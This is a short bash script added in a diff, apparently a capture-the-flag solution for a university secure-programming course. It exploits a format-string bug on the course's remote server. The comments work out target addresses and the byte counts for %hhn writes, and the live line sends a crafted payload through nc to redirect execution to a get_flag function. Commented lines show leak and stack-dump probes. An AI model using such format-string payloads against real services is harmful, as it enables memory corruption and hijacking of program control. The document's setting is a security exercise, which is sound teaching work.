@@ -1,0 +1,28 @@
+#!/bin/bash
+# 0xffb09d08
+# 0x0804861d 110 sym.get_flag
+# AAAA
+#0x400
+#0xf7724c20
+#0x1a61e0
+#0x1a61e0
+#0x8
+#0x804868b
+#0x41414141
+
+#\xff \xb0 \x9d \x08
+#\xff \xb0 \x9d \x09
+#\xff \xb0 \x9d \x0a
+#\xff \xb0 \x9d \x0b
+
+# \x08\x9d\xb0\xff\x09\x9d\xb0\xff\x0a\x9d\xb0\xff\x0b\x9d\xb0\xff
+#
+#%29c%7$hhn     -> 1d = 29
+#%105c%8$hhn    -> 86 = 134
+#%126c%9$hhn    -> 04 = 4
+#%4c%10$hhn     -> 08 = 8
+
+#python -c 'print "AA\x60\xa0\x04\x08%38$s\n"' | nc secprog.cs.nctu.edu.tw 10105
+# python -c 'print "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n"' | nc secprog.cs.nctu.edu.tw 10105
+python -c 'print "\x08\x9d\xb0\xff\x09\x9d\xb0\xff\x0a\x9d\xb0\xff\x0b\x9d\xb0\xff%29c%7$hhn%105c%8$hhn%126c%9$hhn%4c%10$hhn\n"' | nc secprog.cs.nctu.edu.tw 10105
+# %29c%7$hhn%105c%8$hhn%126c%9$hhn%4c%10$hhn
